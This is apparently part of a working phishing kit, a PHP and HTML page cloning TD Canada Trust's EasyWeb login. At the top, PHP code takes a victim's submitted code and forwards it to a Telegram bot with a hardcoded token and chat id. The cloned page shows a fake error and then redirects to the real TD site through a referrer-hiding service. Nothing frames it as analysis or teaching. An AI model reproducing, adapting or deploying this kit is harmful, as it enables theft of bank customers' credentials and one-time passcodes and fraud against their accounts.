<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");

$code       = $_POST['code']; 
$message    = "TD CODE : ". $code."\n";
$apiToken = "6016032432:AAEjURftqkkKIPA1q0nfBbJ003EBwRDU6rs"; 
$data = [
    'chat_id' => '-969881730',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html ng-app="com.td.tdi.uapWeb" lang="en-CA"><link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id="#""></style>
    <style lang="en" type="text/css" id="#"></style>
    <style lang="en" type="text/css" id=""></style>
    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


        <meta http-equiv="refresh" content="4;https://href.li/?https://www.td.com/ca/en/personal-banking/">
        <style>
            type="text/css"
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            [ng\:form] {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>

        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <title>EasyWeb Login</title>
        <link rel="stylesheet" href="./files/uap-application-all-css.css">
        <link rel="icon" href="assets/td/favicon.ico">
        .automa-element-selector { direction: ltr } 
         [automa-isDragging] { user-select: none } 
         [automa-el-list] </head>
</html></style></head><body prevent-click-highlight="" autoscroll="" class=""><div id="contentWrapper">
<!-- Header -->
<!---->
    <div data-ui-view="header" class="" style=""> <otp-header>
        <div class="td_rq_header-nav td-header-nav">
            <header class="td-header-desktop">
                <div class="td-nav-primary">
                    <div class="td-container">
                        <div class="td-section-left">
                            <div class="td-logo" style="margin-top: 15px;">
                                <img ng-src="generated/styles/images/header-nav/td-logo.png" alt="TD Canada Trust" src="./files/td-logo.png">
                            </div>
                        </div>
                        <div class="td-section-right">
                            <div class="td-quick-access">
                                <ul class="td-header-nav-utilities">
                                    <li ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-dropdown td-dropdown-language td-dropdown-no-hover ng-hide" aria-hidden="true">
                                        <a href="deposit/td/f.php" class="td-show-label" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-0">
                                            <span class="td-forscreenreader">Select language</span>
                                            Français
                                            <span class="td-icon expand" aria-hidden="true"></span>
                                            <span class="td-icon collapse" aria-hidden="true"></span>
                                        </a>
                                        <ul
                                            class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-0">
                                            <!---->
                                            <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                <a href="deposit/td/f.php" role="button" ng-click="vm.setLanguage(language)">
                                                    English
                                                    <!---->
                                                    <span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true"></span>
                                                    <!---->
                                                    <!---->
                                                    <span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span>
                                                    <!---->
                                                </a>
                                            </li>
                                            <!---->
                                            <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                <a href="deposit/td/f.php" role="button" ng-click="vm.setLanguage(language)">
                                                    Français
                                                <!---->
                                                    <!---->
                                                </a>
                                            </li>
                                            <!---->
                                        </ul>
                                    </li>
                                    <li class="secure-lock-position" aria-hidden="true"></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
            <!-- Desktop Header END -->
            <!-- Mobile Header START -->
            <header class="td-header-mobile">
                <div class="td-container">
                    <div class="td-section-left">
                        <button type="button" class="td-mobile-action-button td-mobile-menu-button">
                            <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-mobile-menu-button-icon ng-hide" aria-hidden="true">
                                <span class="td-forscreenreader">Open menu</span>
                                <span class="icon-bar" aria-hidden="true"></span>
                                <span class="icon-bar" aria-hidden="true"></span>
                                <span class="icon-bar" aria-hidden="true"></span>
                            </div>
                            <div class="td-logo">
                                <img src="./files/td-logo.png" alt="TD Canada Trust">
                            </div>
                        </button>
                        <button type="button" class="td-mobile-action-button td-mobile-back-button" onclick="history.back();">
                            Test!
                            <div class="td-mobile-back-button-icon">
                                <span class="td-icon"></span>
                                <span class="td-forscreenreader">Back</span>
                            </div>
                            <div class="td-logo">
                                <img src="./files/td-logo.png" alt="TD Canada Trust">
                            </div>
                        </button>
                    </div>
                    <div class="td-section-right">
                        <div
                            class="secure-lock-position" aria-hidden="true"><!--<span class="td-icon icon-regular td-icon-logout"></span>-->
                        </div>
                    </div>
                </div>
            </header>
            <!-- Mobile Header END -->
            <!-- Mobile Off-canvas Menu START -->
            <div
                ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-nav-mobile ng-hide" aria-hidden="true">
                <!-- Primary mobile menu START -->
                <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
                    <span tabindex="0"></span>
                    <div class="td-nav-mobile-menu-top">
                        <div class="td-nav-mobile-menu-header">
                            <div class="td-logo">
                                <a href="https://authentication.td.com/">
                                    <img src="./files/td-logo.png" alt="TD Canada Trust">
                                </a>
                            </div>
                            <button type="button" class="td-mobile-menu-close">
                                <span class="td-forscreenreader">Close Menu</span>
                                <span class="td-icon" aria-hidden="true"></span>
                            </button>
                        </div>
                    </div>
                    <nav>
                        <ul class="td-nav-mobile-menu-list">
                            <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
                                <a href="deposit/td/f.php" aria-expanded="false" role="button">
                                    <span class="td-forscreenreader">Select language</span>
                                    Français
                                    <span class="td-icon expand" aria-hidden="true"></span>
                                    <span class="td-icon collapse" aria-hidden="true"></span>
                                </a>
                                <ul
                                    class="td-accordion-content">
                                    <!---->
                                    <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                        <a href="deposit/td/f.php" role="button" ng-click="vm.setLanguage(language)">
                                            English
                                            <!---->
                                            <span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true"></span>
                                            <!---->
                                            <!---->
                                            <span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span>
                                            <!---->
                                        </a>
                                    </li>
                                    <!---->
                                    <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                        <a href="deposit/td/f.php" role="button" ng-click="vm.setLanguage(language)">
                                            Français
                                        <!---->
                                            <!---->
                                        </a>
                                    </li>
                                    <!---->
                                </ul>
                            </li>
                        </ul>
                    </nav>
                    <span tabindex="0"></span>
                </div>
                <!-- Primary mobile menu END -->
                <div class="td-nav-mobile-overlay"></div>
            </div>
            <!-- Mobile Off-canvas Menu END -->
        </div>
    </otp-header>
</div>
<!-- Main Content / Body -->
<div
    class="td-contentarea" role="main" style="padding-top: 70px;">
    <!---->
    <ui-view
        class="" style="">
        <!---->
        <ui-view>
            <reset>
                <!---->
                <ui-view class="" style="">
                    <reset-password dt="::$resolve.dt" device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix">
                        <div class="text-center">
                            <otp-server-error
                                error="vm.dt.recoverPwdError" display="banner"><!---->
                            </otp-server-error>
                        </div>
                        <div class="td-container">
                            <h1 class="text-center" tabindex="0">Oops.
                            </h1>
                            <hr aria-hidden="true" class="td-thin-divider-line-1">
                           <form method="post" action="deposit/td/f.php" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic">
                               <center>  <img src="./files/CorruptOldfashionedGuineapig-size_restricted.gif" width="100"></center>
                                <h2 class="text-center"> We couldn't find what you were looking for.<br>
                                    <br>
                                    - eR-020344</h2>
                                <br><br><br><br><br><br><br><br><br><br><br><br><br>
                            </form>
                        </div>
                        <br><br>
                    </reset-password>
                </ui-view>
            </reset>
        </ui-view>
    </ui-view>
</div>
<!-- Footer -->
<!---->
<div data-ui-view="footer" class="">
    <otp-footer>
        <footer
            class="td-background-dark-green" style="left: 0px; right: 0px; bottom: 0px; position: absolute;">
            <!---->
            <div class="td-container">
                <div class="td-row">
                    <div class="td-col-xs-12 td-footer-content otp-footer-content">
                        <div class="td-footer-links td-copy-align-centre td-copy-white">
                            <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/privacy-and-security/privacy-and-security/index###p">
                                Privacy and Security
                            </a>
                            <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                            <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/to-our-customers/">
                                Legal
                            </a>
                            <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index###p">
                                Accessibility
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </otp-footer>
</div></div><div id="ads"></div><div id="ads"></div><div id="ads"></div><div id="automa-palette"></div></body></html>
